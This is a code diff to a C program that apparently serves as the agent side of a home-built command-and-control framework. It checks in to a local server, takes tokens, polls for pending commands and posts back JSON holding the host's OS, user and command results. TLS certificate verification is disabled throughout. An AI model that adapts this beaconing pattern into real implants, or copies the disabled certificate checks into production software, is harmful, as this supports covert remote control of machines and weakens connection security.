@@ -18,6 +18,7 @@ char *first_response;
 char *polling_response;
 char *access_token;
 char *refresh_token;
+char *token_resp;
 
 char *document_id;
 char *document_ip;
@@ -34,8 +35,10 @@ char **command_output[100];
 char *final_json;
 
 struct json_object *parsed_json;
+struct json_object *refresh_token_resp;
 struct json_object *token;
 struct json_object *refresh;
+struct json_object *new_refresh;
 struct json_object *id;
 struct json_object *agent_id;
 struct json_object *rev;
@@ -119,6 +122,7 @@ void poll_callback(void *ptr, size_t size, size_t nmemb, void *stream){
     	json_object_object_get_ex(parsed_json,"os",&os);
     	json_object_object_get_ex(parsed_json,"pending_commands",&pending_commands);
     	json_object_object_get_ex(parsed_json,"user",&user);
+    	json_object_object_get_ex(parsed_json,"_rev",&rev);
     	document_agent_id = json_object_get_string(agent_id);
     	document_rev = json_object_get_string(rev);
     	document_os = json_object_get_string(os);
@@ -198,24 +202,44 @@ void poll_callback(void *ptr, size_t size, size_t nmemb, void *stream){
     		json_object_object_add(post_object,"pending_commands",pend_array);
     		//printf ("The json object created: %s\n",json_object_to_json_string(post_object));
     		final_json = json_object_to_json_string(post_object);
+    		printf("attemping to post json\n");
+		    CURL *curl;
+			CURLcode res;
+			//POST REQUEST
+			curl_global_init(CURL_GLOBAL_DEFAULT);
+			curl = curl_easy_init();
+			if (curl){
+				struct curl_slist *chunk = NULL;
+				curl_easy_setopt(curl, CURLOPT_POST, 12L);
+				curl_easy_setopt(curl, CURLOPT_POSTFIELDS, final_json);
+				/* Settings headers below */
+				char header_doc[100] = "doc_id:";
+				char header_auth[300] = "Authorization:Bearer ";
+				strcat(header_doc,document_id);
+				strcat(header_auth,access_token);
+				//printf("%s\n",header_auth );
+				//printf("%s\n",header_doc );
+				chunk = curl_slist_append(chunk,header_auth);
+				chunk = curl_slist_append(chunk,header_doc);
+				chunk = curl_slist_append(chunk,"Content-Type:application/json");
+				//chunk = curl_slist_append(chunk,"Agent:TGVhcm5pbmdDVG9CRWxpdGUK");
+				/////////////////////////////
+				curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
+				curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+				curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+				curl_easy_setopt(curl,CURLOPT_URL,"https://127.0.0.1:9000/poll");
+				//curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, poll_callback); // calls polling callback function
+				res = curl_easy_perform(curl);
+				if (res != CURLE_OK)
+					fprintf(stderr,"curl_easy_perform() failed : %s\n",curl_easy_strerror(res));
+				curl_easy_cleanup(curl);
+			}
+			curl_global_cleanup();
 
 
 
-    /*{
-  "_id": "91f836e1a5e1e8ab04a1f042dc0236e1",
-  "_rev": "1-25508e47ebb1ce584141291c1e3ef7ad",
-  "agent_id": "50806",
-  "os": "Windows",
-  "ip": "0.0.0.0",
-  "user": "guest",
-  "completed_commands": [],
-  "pending_commands": []
-}
-*/
 
-
-    		
-
+    	
 
     	}
 
@@ -363,7 +387,7 @@ int get_refresh_token(char * refresh,char *url){
 		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
 		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
 		curl_easy_setopt(curl,CURLOPT_URL,url);
-		//curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, refresh_callback); // calls polling callback function
+		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, first_check_in_callback); // calls polling callback function
 		res = curl_easy_perform(curl);
 		if (res != CURLE_OK)
 			fprintf(stderr,"curl_easy_perform() failed : %s\n",curl_easy_strerror(res));
@@ -378,6 +402,7 @@ int main(void){
 	char *test_url = "https://localhost:9000/first_check_in";
 	char *polling_url = "https://localhost:9000/poll";
 	char *refresh_url = "https://localhost:9000/refresh";
+
 	first_check_in(test_url);
 	// setting up json
 	//printf("%s\n",first_response);
@@ -396,19 +421,18 @@ int main(void){
 	//printf("%s\n",json_object_get_string(rev));
 	//printf("%s\n",json_object_get_string(token));
 	access_token = json_object_get_string(token);
+	printf("%s\n",access_token );
 	document_id = json_object_get_string(id);
 	refresh_token = json_object_get_string(refresh);
 	// saving document id as a string
 	// saving access token as a string
 	printf("Successfully Completed Check In\n");
 	printf("Successfully Extracted first response into variables\n");
-	sleep(20);
+	sleep(10);
 	polling(document_id,access_token);
 
-	if (strcmp(final_json, "failed") == 0){
+	if (strcmp(final_json, "failed") == 0)
 		printf("getting refresh token\n");
-		get_refresh_token(refresh_token,refresh_url); // saving output to token global
-	}
 	else
 		printf("it worked\n%s\n",final_json);
 
@@ -440,3 +464,8 @@ int main(void){
 }
 
  */ 
+
+
+
+
+
